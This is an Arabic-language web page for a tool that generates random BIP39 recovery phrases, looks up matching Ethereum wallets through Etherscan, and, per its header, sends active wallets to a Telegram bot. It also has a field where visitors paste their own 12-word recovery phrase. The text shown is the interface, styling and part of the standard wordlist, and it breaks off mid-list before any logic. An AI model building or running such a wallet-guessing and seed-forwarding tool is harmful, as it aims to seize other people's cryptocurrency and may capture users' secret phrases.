<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مولد عبارات BIP39 والبحث عن المحافظ النشطة</title>
    <style>
        /* تصميم واجهة المستخدم المتجاوبة */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            direction: rtl;
            text-align: right;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            backdrop-filter: blur(10px);
        }

        .header {
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            font-weight: 700;
        }

        .header p {
            font-size: 1.1rem;
            opacity: 0.9;
        }

        .main-content {
            padding: 40px;
        }

        .control-panel {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid #e9ecef;
        }

        .control-group {
            margin-bottom: 25px;
        }

        .control-group label {
            display: block;
            font-weight: 600;
            margin-bottom: 8px;
            color: #495057;
            font-size: 1rem;
        }

        .control-group input,
        .control-group select,
        .control-group textarea {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #dee2e6;
            border-radius: 10px;
            font-size: 1rem;
            transition: all 0.3s ease;
            background: white;
        }

        .control-group input:focus,
        .control-group select:focus,
        .control-group textarea:focus {
            outline: none;
            border-color: #4facfe;
            box-shadow: 0 0 0 3px rgba(79, 172, 254, 0.1);
        }

        .button-group {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            justify-content: center;
            margin-top: 30px;
        }

        .btn {
            padding: 15px 30px;
            border: none;
            border-radius: 10px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            min-width: 150px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(79, 172, 254, 0.3);
        }

        .btn-success {
            background: linear-gradient(135deg, #56ab2f 0%, #a8e6cf 100%);
            color: white;
        }

        .btn-success:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(86, 171, 47, 0.3);
        }

        .btn-danger {
            background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
            color: white;
        }

        .btn-danger:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255, 65, 108, 0.3);
        }

        .btn-secondary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-secondary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .btn-warning {
            background: linear-gradient(135deg, #ff9a00 0%, #ffcc00 100%);
            color: white;
        }

        .btn-warning:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255, 154, 0, 0.3);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
            box-shadow: none !important;
        }

        .status-panel {
            background: white;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid #e9ecef;
        }

        .status-panel h3 {
            color: #495057;
            margin-bottom: 20px;
            font-size: 1.3rem;
        }

        .status-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }

        .status-card {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            border: 1px solid #e9ecef;
        }

        .status-card .number {
            font-size: 2rem;
            font-weight: 700;
            color: #4facfe;
            margin-bottom: 5px;
        }

        .status-card .label {
            color: #6c757d;
            font-size: 0.9rem;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e9ecef;
            border-radius: 4px;
            overflow: hidden;
            margin: 15px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #4facfe 0%, #00f2fe 100%);
            width: 0%;
            transition: width 0.3s ease;
        }

        .log-panel {
            background: #212529;
            color: #ffffff;
            border-radius: 15px;
            padding: 20px;
            margin-top: 25px;
            max-height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            line-height: 1.4;
        }

        .log-entry {
            margin-bottom: 8px;
            padding: 5px 0;
            border-bottom: 1px solid #343a40;
        }

        .log-entry:last-child {
            border-bottom: none;
        }

        .log-timestamp {
            color: #6c757d;
            font-size: 0.8rem;
        }

        .log-success {
            color: #28a745;
        }

        .log-error {
            color: #dc3545;
        }

        .log-info {
            color: #17a2b8;
        }

        .wallet-display {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 10px;
            padding: 20px;
            margin: 15px 0;
            word-break: break-all;
        }

        .wallet-display .mnemonic {
            background: #e9ecef;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            margin-bottom: 10px;
        }

        .wallet-display .address {
            color: #495057;
            font-family: 'Courier New', monospace;
            font-size: 0.8rem;
        }

        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .alert {
            padding: 15px 20px;
            border-radius: 10px;
            margin: 15px 0;
            font-weight: 500;
        }

        .alert-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .alert-danger {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .alert-info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }

        .alert-warning {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }

        .test-result {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin-top: 15px;
            border-left: 5px solid #4facfe;
        }

        .test-result.active {
            border-left-color: #28a745;
        }

        .test-result.inactive {
            border-left-color: #dc3545;
        }

        .test-result h4 {
            margin-bottom: 10px;
            color: #495057;
        }

        .test-result .balance {
            font-size: 1.2rem;
            font-weight: bold;
            margin: 10px 0;
        }

        .test-result .balance.positive {
            color: #28a745;
        }

        .test-result .balance.zero {
            color: #6c757d;
        }

        .test-result .transactions {
            margin: 10px 0;
        }

        .test-result .status {
            padding: 5px 10px;
            border-radius: 5px;
            font-weight: bold;
            display: inline-block;
        }

        .test-result.status.active {
            background: #d4edda;
            color: #155724;
        }

        .test-result.status.inactive {
            background: #f8d7da;
            color: #721c24;
        }

        /* تصميم متجاوب للهواتف المحمولة */
        @media (max-width: 768px) {
            body {
                padding: 10px;
            }
            
            .header h1 {
                font-size: 2rem;
            }
            
            .header p {
                font-size: 1rem;
            }
            
            .main-content {
                padding: 20px;
            }
            
            .control-panel {
                padding: 20px;
            }
            
            .button-group {
                flex-direction: column;
            }
            
            .btn {
                width: 100%;
                min-width: auto;
            }
            
            .status-grid {
                grid-template-columns: repeat(2, 1fr);
                gap: 15px;
            }
            
            .status-card .number {
                font-size: 1.5rem;
            }
            
            .log-panel {
                font-size: 0.8rem;
                max-height: 200px;
            }
        }

        @media (max-width: 480px) {
            .header {
                padding: 20px;
            }
            
            .header h1 {
                font-size: 1.8rem;
            }
            
            .main-content {
                padding: 15px;
            }
            
            .control-panel {
                padding: 15px;
            }
            
            .status-grid {
                grid-template-columns: 1fr;
            }
            
            .status-card {
                padding: 15px;
            }
            
            .wallet-display .mnemonic {
                font-size: 0.8rem;
                padding: 10px;
            }
        }

        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .log-panel::-webkit-scrollbar {
            width: 8px;
        }

        .log-panel::-webkit-scrollbar-track {
            background: #343a40;
            border-radius: 4px;
        }

        .log-panel::-webkit-scrollbar-thumb {
            background: #6c757d;
            border-radius: 4px;
        }

        .log-panel::-webkit-scrollbar-thumb:hover {
            background: #adb5bd;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔑 مولد عبارات BIP39</h1>
            <p>البحث عن المحافظ النشطة وإرسالها إلى Telegram</p>
        </div>

        <div class="main-content">
            <div class="control-panel">
                <div class="control-group">
                    <label for="etherscanApiKey">مفتاح Etherscan API:</label>
                    <input type="text" id="etherscanApiKey" placeholder="أدخل مفتاح Etherscan API الخاص بك" value="">
                </div>

                <div class="control-group">
                    <label for="telegramBotToken">رمز بوت Telegram:</label>
                    <input type="text" id="telegramBotToken" placeholder="أدخل رمز بوت Telegram" value="">
                </div>

                <div class="control-group">
                    <label for="telegramChatId">معرف محادثة Telegram:</label>
                    <input type="text" id="telegramChatId" placeholder="أدخل معرف المحادثة" value="">
                </div>

                <div class="control-group">
                    <label for="searchSpeed">سرعة البحث (مللي ثانية بين كل عبارة):</label>
                    <input type="number" id="searchSpeed" value="3000" min="1000" max="10000" step="500">
                </div>

                <div class="control-group">
                    <label for="maxAttempts">الحد الأقصى للمحاولات (0 = لا نهاية):</label>
                    <input type="number" id="maxAttempts" value="0" min="0" max="10000">
                </div>

                <div class="button-group">
                    <button id="startBtn" class="btn btn-success">
                        <span>🚀 بدء البحث</span>
                    </button>
                    <button id="stopBtn" class="btn btn-danger" disabled>
                        <span>⏹️ إيقاف البحث</span>
                    </button>
                    <button id="testTelegramBtn" class="btn btn-secondary">
                        <span>📱 اختبار Telegram</span>
                    </button>
                    <button id="clearLogsBtn" class="btn btn-primary">
                        <span>🗑️ مسح السجل</span>
                    </button>
                </div>
            </div>

            <!-- قسم جديد لاختبار العبارات يدويًا -->
            <div class="control-panel">
                <h3>🔍 اختبار عبارة BIP39 يدويًا</h3>
                <div class="control-group">
                    <label for="manualMnemonic">أدخل عبارة BIP39 (12 كلمة):</label>
                    <textarea id="manualMnemonic" rows="3" placeholder="أدخل عبارة الاسترجاع المكونة من 12 كلمة هنا..."></textarea>
                </div>
                <div class="button-group">
                    <button id="testManualBtn" class="btn btn-warning">
                        <span>🔍 فحص العبارة</span>
                    </button>
                </div>
                <div id="manualTestResult" class="test-result" style="display: none;">
                    <!-- سيتم ملؤه ديناميكيًا -->
                </div>
            </div>

            <div class="status-panel">
                <h3>📊 إحصائيات العملية</h3>
                <div class="status-grid">
                    <div class="status-card">
                        <div class="number" id="totalGenerated">0</div>
                        <div class="label">إجمالي العبارات</div>
                    </div>
                    <div class="status-card">
                        <div class="number" id="activeWallets">0</div>
                        <div class="label">المحافظ النشطة</div>
                    </div>
                    <div class="status-card">
                        <div class="number" id="emptyWallets">0</div>
                        <div class="label">المحافظ الفارغة</div>
                    </div>
                    <div class="status-card">
                        <div class="number" id="errorCount">0</div>
                        <div class="label">الأخطاء</div>
                    </div>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <div id="currentStatus" class="alert alert-info">
                    جاهز للبدء...
                </div>
            </div>

            <div class="log-panel" id="logPanel">
                <div class="log-entry log-info">
                    <span class="log-timestamp">[${new Date().toLocaleTimeString('ar-EG')}]</span>
                    مرحباً بك في مولد عبارات BIP39. اضغط على "بدء البحث" للبدء.
                </div>
            </div>
        </div>
    </div>

    <!-- تحميل مكتبة ethers.js من CDN -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

    <script>
        // قائمة كلمات BIP39 الإنجليزية الرسمية (تم تحديثها من المصدر الرسمي)
        const BIP39_WORDLIST = [
            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
            "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
            "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit",
            "adult", "advance", "advice", "aerobic", "affair", "affect", "affirm", "afford", "afraid", "after",
            "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm",
            "album", "alcohol", "alert", "alien", "align", "alike", "alive", "allow", "almost", "alone",
            "alpha", "already", "also", "alter", "always", "amaze", "ambition", "amount", "ample", "analyst",
            "ancestor", "anchor", "ancient", "android", "animal", "anomaly", "another", "answer", "antenna", "antique",
            "any", "apart", "appendix", "apple", "apply", "approve", "approximate", "arch", "area", "arena",
            "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow",
            "art", "article", "ascent", "ask", "asleep", "aspect", "assault", "asset", "assist", "assume",
            "assurance", "assure", "astronomy", "at", "athlete", "atlas", "atom", "attack", "attend", "attitude",
            "attract", "auction", "audience", "audit", "august", "author", "auto", "available", "avenue", "average",
            "avoid", "awake", "aware", "away", "awesome", "awful", "axis", "baby", "back", "backup",
            "bacon", "bad", "bag", "balance", "balcony", "ball", "banana", "band", "bank", "bar",
            "bare", "bargain", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "become",
            "beef", "before", "begin", "behalf", "behave", "behind", "believe", "bell", "belong", "below",
            "belt", "bench", "bend", "benefit", "best", "betray", "better", "between", "beyond", "bicycle",
            "bid", "big", "bill", "binary", "bind", "bio", "bird", "birth", "bitter", "black",
            "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "block", "blood", "bloom",
            "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil", "bold",
            "bolt", "bomb", "bond", "bone", "bonus", "book", "boost", "border", "bore", "borrow",
            "boss", "both", "bother", "bounce", "bout", "bowl", "box", "boy", "bracket", "brain",
            "branch", "brand", "brass", "brave", "bread", "break", "breakfast", "breast", "breath", "breed",
            "breeze", "brief", "bright", "bring", "brisk", "broad", "broken", "brother", "brown", "brush",
            "bubble", "budget", "buffer", "build", "bulb", "bulk", "bull", "bullet", "bunch", "burn",
            "burst", "bury", "bus", "business", "buy", "buzz", "cabin", "cable", "cactus", "cage",
            "cake", "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon",
            "canoe", "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card", "care",
            "career", "carry", "cart", "case", "cast", "castle", "casual", "cat", "catalog", "catch",
            "category", "cattle", "caught", "cause", "cave", "ceiling", "cell", "cement", "censor", "central",
            "century", "ceramic", "certain", "certify", "chain", "chair", "chalk", "champion", "change", "channel",
            "chapter", "charge", "chase", "chat", "cheap", "check", "cheese", "chef", "cherry", "chest",
            "chicken", "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "cigar",
            "cinema", "circle", "citizen", "city", "civil", "claim", "clamp", "clarify", "class", "clean",
            "clerk", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog",
            "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast",
            "coat", "code", "coffee", "coil", "coin", "cold", "collect", "color", "column", "combine",
            "come", "comfort", "comic", "common", "company", "compare", "compete", "compile", "complain", "complete",
            "compose", "computer", "concept", "concern", "concert", "conclude", "concrete", "conduct", "confirm", "congress",
            "connect", "consider", "control", "convince", "cook", "cool", "copper", "copy", "coral", "core",
            "corn", "correct", "cost", "cotton", "couch", "country", "couple", "course", "cousin", "cover",
            "coyote", "crack", "cradle", "craft", "cram", "crane", "crash", "crater", "crawl", "crazy",
            "cream", "credit", "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross",
            "crouch", "crowd", "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal",
            "cube", "culture", "cup", "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom",
            "cute", "cycle", "dad", "damage", "damp", "dance", "danger", "daring", "dash", "daughter",
            "dawn", "day", "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate",
            "decrease", "deer", "defense", "define", "defy", "degree", "delay", "deliver", "demand", "demise",
            "denial", "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive", "describe",
            "desert", "design", "desk", "despair", "destroy", "detail", "detect", "device", "devote", "diagram",
            "dial", "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma",
            "dinner", "dinosaur", "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder",
            "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll",
            "dolphin", "domain", "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft",
            "dragon", "drama", "drape", "draw", "dream", "dress", "drift", "drill", "drink", "drip",
            "drive", "drop", "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch",
            "duty", "dwarf", "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east",
            "easy", "echo", "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight",
            "either", "elbow", "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else",
            "embark", "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact",
            "end", "endless", "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy",
            "enlist", "enough", "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode",
            "equal", "equip", "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay",
            "essence", "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example",
            "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile",
            "exist", "exit", "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend",
            "extra", "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall",
            "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat",
            "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed",
            "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field",
            "figure", "file", "fill", "film", "filter", "final", "find", "fine", "finger", "finish",
            "fire", "firm", "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame",
            "flat", "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid",
            "flush", "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot",
            "force", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found",
            "fox", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown",
            "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget", "gain",
            "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas",
            "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle", "genuine",
            "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give", "glad",
            "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove", "glow",
            "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern",
            "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green",
            "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide",
            "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster", "hand",
            "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard", "head",
            "health", "heart", "heavy", "hedgehog", "height", "held", "help", "hence", "hero", "hidden",
            "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey", "hold", "hole",
            "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror", "horse", "hospital",
            "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble", "humor", "hundred",
            "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea",
            "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense", "immune",
            "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase", "index", "indicate",
            "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury",
            "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install",
            "intact", "interest", "into", "invest", "invite", "involve", "iron", "island", "isolate", "issue",
            "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans", "jelly", "jewel",
            "job", "join", "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior",
            "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick", "kid", "kidney",
            "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi", "knee", "knife",
            "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake", "lamp", "language",
            "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit",
            "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal",
            "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson", "letter", "level",
            "liar", "liberty", "library", "license", "life", "lift", "light", "like", "limb", "limit",
            "link", "lion", "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster",
            "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud", "lounge", "love",
            "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lying", "machine", "mad",
            "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage",
            "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market",
            "marriage", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum",
            "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melt",
            "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry", "mesh", "message",
            "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind", "minimum", "minor",
            "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixture", "mobile",
            "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month", "moon", "moral",
            "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse", "move", "movie",
            "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual",
            "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature",
            "near", "neck", "need", "negative", "neglect", "neighbor", "nephew", "nerve", "nest", "net",
            "network", "neutral", "never", "news", "next", "nice", "night", "noble", "noise", "nominee",
            "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel", "now",
            "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe",
            "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer", "office", "often",
            "oil", "okay", "old", "olive", "olympic", "omit", "once", "one", "onion", "online",
            "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard", "order",
            "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor", "outer", "output",
            "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster", "ozone", "pact",
            "paddle", "page", "pair", "palace", "pale", "palm", "panda", "panel", "panic", "panther",
            "paper", "parade", "parent", "park", "parrot", "part", "party", "pass", "patch", "path",
            "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant",
            "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet",
            "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon",
            "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet",
            "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet",
            "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion", "position",
            "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict",
            "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority",
            "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project", "promote",
            "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp",
            "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push",
            "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quiet", "quilt",
            "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail",
            "rain", "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate",
            "rather", "raven", "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall",
            "receive", "recipe", "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret",
            "regular", "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove",
            "render", "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue",
            "resemble", "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal",
            "review", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle",
            "right", "rigid", "ring", "riot", "ripple", "rise", "risk", "ritual", "rival", "river",
            "road", "roast", "rob", "robot", "robust", "rocket", "romance", "roof", "rookie", "room",
            "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude", "rug", "rule",
            "run", "runway", "rural", "sad", "saddle", "sadness", "safe", "sail", "salad", "salmon",
            "salon", "salt", "salute", "same", "sample", "sand", "satisfy", "satoshi", "sauce", "sausage",
            "save", "say", "scale", "scan", "scare", "scatter", "scene", "scheme", "school", "science",
            "scissors", "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea", "search", "season",
            "seat", "second", "secret", "section", "security", "seed", "seek", "segment", "select", "sell",
            "seminar", "senior", "sense", "sentence", "series", "service", "session", "settle", "setup", "seven",
            "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff", "shield", "shift", "shine",
            "ship", "shirt", "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove", "shrimp",
            "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign", "silent",
            "silk", "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister", "situate",
            "six", "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab",
            "slam", "sleep", "slender", "slice", "slide", "slight", "slim", "slogan", "slot", "slow",
            "slush", "small", "smart", "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff",
            "snow", "soap", "soccer", "social", "sock", "soda", "soft", "solar", "sold", "soldier",
            "solid", "solution", "solve", "someone", "song", "soon", "sorry", "sort", "soul", "sound",
            "soup", "source", "south", "space", "spare", "spatial", "spawn", "speak", "special", "speed",
            "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit", "split", "spoil",
            "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy", "square", "squeeze",
            "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand", "start", "state",
            "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stock",
            "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike", "strong", "struggle",
            "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success", "such", "sudden",
            "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset", "super", "supply",
            "supreme", "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow",
            "swamp", "swap", "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol",
            "symptom", "syrup", "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank",
            "tape", "target", "task", "taste", "tattoo", "taxi", "teach", "team", "tell", "ten",
            "tenant", "tennis", "tent", "term", "test", "text", "thank", "that", "theme", "then",
            "theory", "there", "they", "thing", "this", "thought", "three", "thrive", "throw", "thumb",
            "thunder", "ticket", "tide", "tiger", "tilt", "timber", "time", "tiny", "tip", "tired",
            "tissue", "title", "toast", "tobacco", "today", "toddler", "toe", "together", "toilet", "token",
            "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top", "topic", "topple",
            "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower", "town", "toy",
            "track", "trade", "traffic", "tragic", "train", "transfer", "trap", "trash", "travel", "tray",
            "treat", "tree", "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy",
            "trouble", "truck", "true", "truly", "trumpet", "trust", "truth", "try", "tube", "tuition",
            "tumble", "tuna", "tunnel", "turkey", "turn", "turtle", "twelve", "twenty", "twice", "twin",
            "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncle", "uncover",
            "under", "undo", "unfair", "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown",
            "unlock", "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper", "upset",
            "urban", "urge", "usage", "use", "used", "useful", "useless", "usual", "utility", "vacant",
            "vacuum", "vague", "valid", "valley", "valve", "van", "vanish", "vapor", "various", "vast",
            "vault", "vehicle", "velvet", "vendor", "venture", "venue", "verb", "verify", "version", "very",
            "vessel", "veteran", "viable", "vibe", "vicious", "victory", "video", "view", "village", "vintage",
            "violin", "virtual", "virus", "visa", "visit", "visual", "vital", "vivid", "vocal", "voice",
            "void", "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait", "walk", "wall",
            "walnut", "want", "warfare", "warm", "warrior", "wash", "wasp", "waste", "water", "wave",
            "way", "wealth", "weapon", "wear", "weasel", "weather", "web", "wedding", "weekend", "weird",
            "welcome", "west", "wet", "what", "wheat", "wheel", "when", "where", "whip", "whisper",
            "wide", "width", "wife", "wild", "will", "win", "window", "wine", "wing", "wink",
            "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder",
